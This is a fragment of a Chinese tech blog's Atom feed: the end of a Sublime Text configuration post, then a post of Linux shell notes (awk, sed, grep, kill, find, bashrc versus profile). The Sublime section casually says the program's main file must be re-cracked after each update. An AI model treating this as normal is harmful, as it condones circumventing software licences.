class=&quot;attr&quot;&gt;&amp;quot;update_check&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 自动换行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attr&quot;&gt;&amp;quot;word_wrap&amp;quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;quot;true&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-关闭自动更新&quot;&gt;&lt;a href=&quot;#2-关闭自动更新&quot; class=&quot;headerlink&quot; title=&quot;2. 关闭自动更新&quot;&gt;&lt;/a&gt;2. 关闭自动更新&lt;/h3&gt;&lt;p&gt;SublimeText的升级挺快的，每次升级完之后都要重新破解一次主文件，不用重新注册，如果嫌更新太麻烦可以在用户配置中加入如下配置禁用自动更新：&lt;/p&gt;
&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;update_check&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-soda主题&quot;&gt;&lt;a href=&quot;#3-soda主题&quot; class=&quot;headerlink&quot; title=&quot;3. soda主题&quot;&gt;&lt;/a&gt;3. soda主题&lt;/h3&gt;&lt;p&gt;参见：&lt;a href=&quot;https://github.com/buymeasoda/soda-theme/&quot;&gt;https://github.com/buymeasoda/soda-theme/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过package controller安装Theme - Soda。&lt;/p&gt;
&lt;h3 id=&quot;4-记住打开的文件&quot;&gt;&lt;a href=&quot;#4-记住打开的文件&quot; class=&quot;headerlink&quot; title=&quot;4. 记住打开的文件&quot;&gt;&lt;/a&gt;4. 记住打开的文件&lt;/h3&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;quot;remember_open_files&amp;quot;&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="mac" scheme="http://yeshaoting.cn/tags/mac/"/>
    
    <category term="sublime" scheme="http://yeshaoting.cn/tags/sublime/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令小记</title>
    <link href="http://yeshaoting.cn/article/linux/Linux%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yeshaoting.cn/article/linux/Linux%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/</id>
    <published>2016-01-15T10:02:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/ubuntu.png" class="img-logo img-center" /><h2 id="一、awk命令"><a href="#一、awk命令" class="headerlink" title="一、awk命令"></a>一、awk命令</h2><h3 id="1-删除重复的、非连续的行"><a href="#1-删除重复的、非连续的行" class="headerlink" title="1. 删除重复的、非连续的行"></a>1. 删除重复的、非连续的行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`awk &#x27;! a[$0]++&#x27;`</span><br></pre></td></tr></table></figure><h3 id="2-awk使用特殊分隔符分隔列"><a href="#2-awk使用特殊分隔符分隔列" class="headerlink" title="2. awk使用特殊分隔符分隔列"></a>2. awk使用特殊分隔符分隔列</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;192.168.102.134&quot; | awk -F . &#x27;&#123;print $4&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="二、sed命令"><a href="#二、sed命令" class="headerlink" title="二、sed命令"></a>二、sed命令</h2><h3 id="1-截取程序日志中某个时间范围内的文本"><a href="#1-截取程序日志中某个时间范围内的文本" class="headerlink" title="1. 截取程序日志中某个时间范围内的文本"></a>1. 截取程序日志中某个时间范围内的文本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p&#x27; access_log &gt; log.txt</span><br></pre></td></tr></table></figure><h3 id="2-去除空白行的sed"><a href="#2-去除空白行的sed" class="headerlink" title="2. 去除空白行的sed"></a>2. 去除空白行的sed</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET=`sed &#x27;/^$/d&#x27; file.txt | head -1`</span><br></pre></td></tr></table></figure><h3 id="3-通过sed替换字特殊字符"><a href="#3-通过sed替换字特殊字符" class="headerlink" title="3. 通过sed替换字特殊字符"></a>3. 通过sed替换字特殊字符</h3><p><code>echo &quot;12,34,56&quot; | sed &#39;s/,/ /g&#39;</code></p><h3 id="4-通过sed替换二者之间的字符串内容"><a href="#4-通过sed替换二者之间的字符串内容" class="headerlink" title="4. 通过sed替换二者之间的字符串内容"></a>4. 通过sed替换二者之间的字符串内容</h3><p>文本内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>   <span class="attr">id</span>=<span class="string">&quot;film-web&quot;</span>   <span class="attr">address</span>=<span class="string">&quot;127.0.0.1&quot;</span> <span class="attr">port</span>=<span class="string">&quot;6881&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -n &quot;s/\( *server.*port=\&quot;\).*\(\&quot;.*\)/\1abc\2/p&quot; 1.txt</span><br><span class="line">sed -n &quot;s/\( *server.*address=\&quot;\).*\(\&quot; *port\)/\1abc\2/p&quot; 1.txt</span><br></pre></td></tr></table></figure><p><strong>注</strong>：sed里，使用圆括号括起来的内容，可以看做是变量。使用\1和\2来输出。<br><strong>参见</strong>：<a href="http://coolshell.cn/articles/9104.html">http://coolshell.cn/articles/9104.html</a> 圆括号匹配</p><h3 id="5-从替换开始匹配行到行尾或结束匹配行区间内替换内容"><a href="#5-从替换开始匹配行到行尾或结束匹配行区间内替换内容" class="headerlink" title="5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容"></a>5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;/ *server *id=/,\$&#123;s/\(\&lt;watchdog-port&gt;\).*\(&lt;\/watchdog-port&gt;\)/\18000\2/g;&#125;&quot; resin.conf</span><br><span class="line">sed &quot;/ *server *id=\&quot;/,/&lt;\/server&gt;/&#123;s/\(\&lt;watchdog-port&gt;\).*\(&lt;\/watchdog-port&gt;\)/\18888\2/g;&#125;&quot; resin.conf</span><br></pre></td></tr></table></figure><p><strong>注</strong>：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/</p><h2 id="三、grep命令"><a href="#三、grep命令" class="headerlink" title="三、grep命令"></a>三、grep命令</h2><h3 id="1-查找特定文件指定字符串"><a href="#1-查找特定文件指定字符串" class="headerlink" title="1. 查找特定文件指定字符串"></a>1. 查找特定文件指定字符串</h3><p><code>grep &quot;no object DCH for MIME type multipart/mixed&quot; *.log &gt; MIME.log</code></p><h3 id="2-查找文本内容"><a href="#2-查找文本内容" class="headerlink" title="2. 查找文本内容"></a>2. 查找文本内容</h3><p><code>grep -i -r --exclude=*.jar --exclude=*.log* noah .</code></p><h3 id="3-查看tomcat日志特定内容"><a href="#3-查看tomcat日志特定内容" class="headerlink" title="3. 查看tomcat日志特定内容"></a>3. 查看tomcat日志特定内容</h3><p><code>tail -f catalina.out | grep timecost | grep FamilyController | awk &#39;&#123;if($10 &gt; 100) print $0&#125;&#39;</code></p><h3 id="4-查看tomcat某天日志"><a href="#4-查看tomcat某天日志" class="headerlink" title="4. 查看tomcat某天日志"></a>4. 查看tomcat某天日志</h3><p><code>tail -800000 catalina.out | grep 2014-06-30 &gt; 2014-06-30.log</code></p><h3 id="5-记录统计"><a href="#5-记录统计" class="headerlink" title="5. 记录统计"></a>5. 记录统计</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep timecost file.txt | wc -l</span><br><span class="line">ls | wc -l</span><br></pre></td></tr></table></figure><h3 id="6-grep与或非"><a href="#6-grep与或非" class="headerlink" title="6. grep与或非"></a>6. grep与或非</h3><h4 id="与操作"><a href="#与操作" class="headerlink" title="与操作"></a>与操作</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#x27;pattern1.*pattern2&#x27; file.txt # in that order</span><br><span class="line">grep -E &#x27;pattern1.*pattern2|pattern2.*pattern1&#x27; file.txt # in any order</span><br><span class="line">grep &#x27;pattern1&#x27; file.txt | grep &#x27;pattern2&#x27; # in any order</span><br></pre></td></tr></table></figure><h4 id="或操作"><a href="#或操作" class="headerlink" title="或操作"></a>或操作</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pattern1\|pattern2&quot; file.txt</span><br><span class="line">grep -E &quot;pattern1|pattern2&quot; file.txt</span><br><span class="line">grep -e pattern1 -e pattern2 file.txt</span><br><span class="line">egrep &quot;pattern1|pattern2&quot; file.txt</span><br></pre></td></tr></table></figure><h4 id="非操作"><a href="#非操作" class="headerlink" title="非操作"></a>非操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="string">&#x27;pattern1&#x27;</span> file.txt</span><br></pre></td></tr></table></figure><p>摘自：<a href="http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators">Using BASH “Grep OR / Grep AND / Grep NOT” Operators</a></p><h3 id="7-递归查询不包含指定内容的文件"><a href="#7-递归查询不包含指定内容的文件" class="headerlink" title="7. 递归查询不包含指定内容的文件"></a>7. 递归查询不包含指定内容的文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -irL &quot;date:&quot; file.txt</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="四、ps命令"><a href="#四、ps命令" class="headerlink" title="四、ps命令"></a>四、ps命令</h2><h3 id="1-cpu-内存占用率排序"><a href="#1-cpu-内存占用率排序" class="headerlink" title="1. cpu/内存占用率排序"></a>1. cpu/内存占用率排序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps auxw --sort=%cpu</span><br><span class="line">ps auxw --sort=%mem</span><br></pre></td></tr></table></figure><h3 id="2-查看端口占用"><a href="#2-查看端口占用" class="headerlink" title="2. 查看端口占用"></a>2. 查看端口占用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:8080</span><br><span class="line">ps -aux | grep java</span><br><span class="line">ps -aux | grep pid</span><br></pre></td></tr></table></figure><h2 id="五、kill命令"><a href="#五、kill命令" class="headerlink" title="五、kill命令"></a>五、kill命令</h2><h3 id="1-批量关闭进程"><a href="#1-批量关闭进程" class="headerlink" title="1. 批量关闭进程"></a>1. 批量关闭进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 `ps -ef | grep QQ | grep -v <span class="string">&#x27;grep&#x27;</span> | awk &#123;<span class="string">&#x27;print $2&#x27;</span>&#125;`</span><br></pre></td></tr></table></figure><h3 id="2-进程批量中止"><a href="#2-进程批量中止" class="headerlink" title="2. 进程批量中止"></a>2. 进程批量中止</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 `ps -ef | grep QQ | grep -v grep | awk &#123;<span class="string">&#x27;print $2&#x27;</span>&#125;`</span><br></pre></td></tr></table></figure><h2 id="六、vim命令"><a href="#六、vim命令" class="headerlink" title="六、vim命令"></a>六、vim命令</h2><h3 id="1-vim显示-隐藏行号"><a href="#1-vim显示-隐藏行号" class="headerlink" title="1. vim显示/隐藏行号"></a>1. vim显示/隐藏行号</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span> 或 :<span class="keyword">set</span> <span class="keyword">number</span></span><br><span class="line">:<span class="keyword">set</span> nonu 或 :<span class="keyword">set</span> nonumber</span><br></pre></td></tr></table></figure><h3 id="2-vim替换指定区域匹配文本"><a href="#2-vim替换指定区域匹配文本" class="headerlink" title="2. vim替换指定区域匹配文本"></a>2. vim替换指定区域匹配文本</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: <span class="number">41</span>,<span class="number">57</span> s/<span class="number">10.13</span>.<span class="number">92.143</span>/<span class="number">10.13</span>.<span class="number">92.157</span>/g</span><br></pre></td></tr></table></figure><h2 id="七、date命令"><a href="#七、date命令" class="headerlink" title="七、date命令"></a>七、date命令</h2><h3 id="1-打印时间"><a href="#1-打印时间" class="headerlink" title="1. 打印时间"></a>1. 打印时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> `date <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span>`</span><br></pre></td></tr></table></figure><h3 id="2-时间显示"><a href="#2-时间显示" class="headerlink" title="2. 时间显示"></a>2. 时间显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date</span><br><span class="line">date <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="八、cal命令"><a href="#八、cal命令" class="headerlink" title="八、cal命令"></a>八、cal命令</h2><h3 id="1-当年当月"><a href="#1-当年当月" class="headerlink" title="1. 当年当月"></a>1. 当年当月</h3><p><code>cal</code></p><h3 id="2-某年日历"><a href="#2-某年日历" class="headerlink" title="2. 某年日历"></a>2. 某年日历</h3><p><code>cal 2015</code></p><h3 id="3-某年某月"><a href="#3-某年某月" class="headerlink" title="3. 某年某月"></a>3. 某年某月</h3><p><code>cal 12 2015</code></p><h2 id="九、ls命令"><a href="#九、ls命令" class="headerlink" title="九、ls命令"></a>九、ls命令</h2><h3 id="1-linux-下查看文件个数及大小"><a href="#1-linux-下查看文件个数及大小" class="headerlink" title="1. linux 下查看文件个数及大小"></a>1. linux 下查看文件个数及大小</h3><p><code>ls -l |grep &quot;^-&quot;|wc -l 或 find ./company -type f | wc -l</code></p><h3 id="2-查看某文件夹下文件的个数，包括子文件夹里的。"><a href="#2-查看某文件夹下文件的个数，包括子文件夹里的。" class="headerlink" title="2. 查看某文件夹下文件的个数，包括子文件夹里的。"></a>2. 查看某文件夹下文件的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^-&quot;|wc -l</code></p><h3 id="3-查看某文件夹下文件夹的个数，包括子文件夹里的。"><a href="#3-查看某文件夹下文件夹的个数，包括子文件夹里的。" class="headerlink" title="3. 查看某文件夹下文件夹的个数，包括子文件夹里的。"></a>3. 查看某文件夹下文件夹的个数，包括子文件夹里的。</h3><p><code>ls -lR|grep &quot;^d&quot;|wc -l</code></p><h3 id="4-按修改先后，列出文件"><a href="#4-按修改先后，列出文件" class="headerlink" title="4. 按修改先后，列出文件"></a>4. 按修改先后，列出文件</h3><p><code>ls -lt</code></p><h2 id="十、tar命令"><a href="#十、tar命令" class="headerlink" title="十、tar命令"></a>十、tar命令</h2><h3 id="1-tar打包文件，exclude选项排除指定文件或目录"><a href="#1-tar打包文件，exclude选项排除指定文件或目录" class="headerlink" title="1. tar打包文件，exclude选项排除指定文件或目录"></a>1. tar打包文件，exclude选项排除指定文件或目录</h3><p><code>tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs</code></p><h2 id="十一、rm命令"><a href="#十一、rm命令" class="headerlink" title="十一、rm命令"></a>十一、rm命令</h2><h3 id="1-删除-开头的文件"><a href="#1-删除-开头的文件" class="headerlink" title="1. 删除 - 开头的文件"></a>1. 删除 - 开头的文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm --  -filename</span><br><span class="line">rm -- ./-filename</span><br></pre></td></tr></table></figure><h2 id="十二、echo命令"><a href="#十二、echo命令" class="headerlink" title="十二、echo命令"></a>十二、echo命令</h2><h3 id="1-echo输出制表符方式"><a href="#1-echo输出制表符方式" class="headerlink" title="1. echo输出制表符方式"></a>1. echo输出制表符方式</h3><p><code>echo -e &quot;123\t345&quot;</code></p><h3 id="2-shell换行"><a href="#2-shell换行" class="headerlink" title="2. shell换行"></a>2. shell换行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;123\n34&quot;</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>：-e 表示特殊处理字符串里的特殊字符。</p><h2 id="十三、tail语法"><a href="#十三、tail语法" class="headerlink" title="十三、tail语法"></a>十三、tail语法</h2><h3 id="1-查找特定字符串在文件中出现位置"><a href="#1-查找特定字符串在文件中出现位置" class="headerlink" title="1. 查找特定字符串在文件中出现位置"></a>1. 查找特定字符串在文件中出现位置</h3><p><code>tail -2000000 catalina.out | cat -n | grep &quot;2014-07-10&quot; | head  -2 (对于出现在文末)</code></p><h2 id="十四、shell语法"><a href="#十四、shell语法" class="headerlink" title="十四、shell语法"></a>十四、shell语法</h2><h3 id="1-批量解压zip文件"><a href="#1-批量解压zip文件" class="headerlink" title="1. 批量解压zip文件"></a>1. 批量解压zip文件</h3><p><code>for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;</code></p><h3 id="2-判断shell脚本输入参数个数"><a href="#2-判断shell脚本输入参数个数" class="headerlink" title="2. 判断shell脚本输入参数个数"></a>2. 判断shell脚本输入参数个数</h3><p><code>if [ $# -eq 0 ]; then</code></p><h3 id="3-逐行读取文本文件的-shell-脚本"><a href="#3-逐行读取文本文件的-shell-脚本" class="headerlink" title="3. 逐行读取文本文件的 shell 脚本"></a>3. 逐行读取文本文件的 shell 脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">echo $line</span><br><span class="line">done &lt; $1</span><br></pre></td></tr></table></figure><h3 id="4-for循环"><a href="#4-for循环" class="headerlink" title="4. for循环"></a>4. for循环</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for index in &#123;1..31&#125;</span><br><span class="line">do</span><br><span class="line">    ……</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="5-shell注释"><a href="#5-shell注释" class="headerlink" title="5. shell注释"></a>5. shell注释</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:&amp;lt;&amp;lt;comment</span><br><span class="line">这里是个注释哈。</span><br><span class="line">comment</span><br></pre></td></tr></table></figure><h3 id="6-获取shell脚本位置-当前脚本目录"><a href="#6-获取shell脚本位置-当前脚本目录" class="headerlink" title="6. 获取shell脚本位置/当前脚本目录"></a>6. 获取shell脚本位置/当前脚本目录</h3><p>不能解决软链接问题：<code>$(cd &quot;$(dirname &quot;$0&quot;)&quot;; pwd)</code><br>最靠谱，能处理软链接的情况以及source加载脚本的情况：<code>echo $( cd &quot;$( dirname &quot;$&#123;BASH_SOURCE[0]&#125;&quot; )&quot; &amp;&amp; pwd )</code></p><h3 id="7-查看当前bash-shell版本"><a href="#7-查看当前bash-shell版本" class="headerlink" title="7. 查看当前bash shell版本"></a>7. 查看当前bash shell版本</h3><p>echo $BASH_VERSION</p><h3 id="8-理解-bashrc-和-profile"><a href="#8-理解-bashrc-和-profile" class="headerlink" title="8. 理解 bashrc 和 profile"></a>8. 理解 bashrc 和 profile</h3><p>参见：<a href="https://wido.me/sunteya/understand-bashrc-and-profile">理解 bashrc 和 profile</a></p><h4 id="login-shell-和-no-login-shell"><a href="#login-shell-和-no-login-shell" class="headerlink" title="login shell 和 no-login shell"></a>login shell 和 no-login shell</h4><p>“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.<br>该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.<br>而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.<br>该模式下是不会自动去运行任何的 profile 文件.</p><h4 id="interactive-shell-和-non-interactive-shell"><a href="#interactive-shell-和-non-interactive-shell" class="headerlink" title="interactive shell 和 non-interactive shell"></a>interactive shell 和 non-interactive shell</h4><p>interactive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.<br>该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件<br>non-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.<br>该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述</p><h4 id="bashrc-和-profile-的区别"><a href="#bashrc-和-profile-的区别" class="headerlink" title="bashrc 和 profile 的区别"></a>bashrc 和 profile 的区别</h4><p>看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?</p><p><strong>profile</strong><br>其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.</p><p><strong>bashrc</strong><br>bashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.</p><h3 id="9-上条命令是否成功执行"><a href="#9-上条命令是否成功执行" class="headerlink" title="9. 上条命令是否成功执行"></a>9. 上条命令是否成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCODE=$?</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EXCODE</span>&quot;</span> == <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;O.K&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;NOT O.K&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="10-加载配置"><a href="#10-加载配置" class="headerlink" title="10. 加载配置"></a>10. 加载配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. slave.conf</span><br><span class="line">source slave.conf</span><br></pre></td></tr></table></figure><p><strong>注</strong>：slave.conf里的值格式为K=V</p><h3 id="11-执行字符串命令"><a href="#11-执行字符串命令" class="headerlink" title="11. 执行字符串命令"></a>11. 执行字符串命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SLAVE_PID_COMMAND=&quot;ps -ef | grep $SECRET_ID | grep -v grep | awk &#x27;&#123;print \$2&#125;&#x27;&quot;</span><br><span class="line">SLAVE_PID=$(eval $SLAVE_PID_COMMAND)</span><br></pre></td></tr></table></figure><p><strong>注</strong>：<br>$要转义处理执行<br>执行字符串里的命令，使用eval命令<br>获取命令执行结果，可以用$()把命令包里来。</p><h3 id="12-获取某文件路径文件名"><a href="#12-获取某文件路径文件名" class="headerlink" title="12. 获取某文件路径文件名"></a>12. 获取某文件路径文件名</h3><p>basename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz =&gt; jdk1.7.0_60</p><h2 id="十五、find命令"><a href="#十五、find命令" class="headerlink" title="十五、find命令"></a>十五、find命令</h2><h3 id="1-删除所有文件名包含Ulysses-Group的文件"><a href="#1-删除所有文件名包含Ulysses-Group的文件" class="headerlink" title="1. 删除所有文件名包含Ulysses-Group的文件"></a>1. 删除所有文件名包含Ulysses-Group的文件</h3><p><code>find . -name &quot;*Ulysses-Group*&quot; -exec rm -rf &#123;&#125; \;</code></p><h2 id="十六、其他命令"><a href="#十六、其他命令" class="headerlink" title="十六、其他命令"></a>十六、其他命令</h2><h3 id="1-磁盘格式转换为ntfs-会格式化磁盘"><a href="#1-磁盘格式转换为ntfs-会格式化磁盘" class="headerlink" title="1. 磁盘格式转换为ntfs( 会格式化磁盘 )"></a>1. 磁盘格式转换为ntfs( 会格式化磁盘 )</h3><p><code>convert X: /fs:ntfs</code></p><h3 id="2-命令后台处理"><a href="#2-命令后台处理" class="headerlink" title="2. 命令后台处理"></a>2. 命令后台处理</h3><p><code>nohup command &amp;</code></p><h3 id="3-重启ibus"><a href="#3-重启ibus" class="headerlink" title="3. 重启ibus"></a>3. 重启ibus</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">killall ibus-daemon</span><br><span class="line">ibus-daemon -drx</span><br></pre></td></tr></table></figure><h3 id="4-查看用户使用的shell版本"><a href="#4-查看用户使用的shell版本" class="headerlink" title="4. 查看用户使用的shell版本"></a>4. 查看用户使用的shell版本</h3><p>finger [USERNAME]</p><h3 id="5-tee"><a href="#5-tee" class="headerlink" title="5. tee"></a>5. tee</h3><p>重定向到文件并打印到屏幕</p><p>参见：<a href="http://blog.csdn.net/love_gaohz/article/details/8100808">tee–重定向到文件并打印到屏幕</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/ubuntu.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、awk命令&quot;&gt;&lt;a href=&quot;#一、awk命令&quot; class=&quot;headerlink&quot; title=&quot;一、awk命令&quot;&gt;&lt;/a&gt;一、awk命令&lt;/h2&gt;&lt;h3 id=&quot;1-删除重复的、非连续的行&quot;&gt;&lt;a href=&quot;#1-删除重复的、非连续的行&quot; class=&quot;headerlink&quot; title=&quot;1. 删除重复的、非连续的行&quot;&gt;&lt;/a&gt;1. 删除重复的、非连续的行&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;`awk &amp;#x27;! a[$0]++&amp;#x27;`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


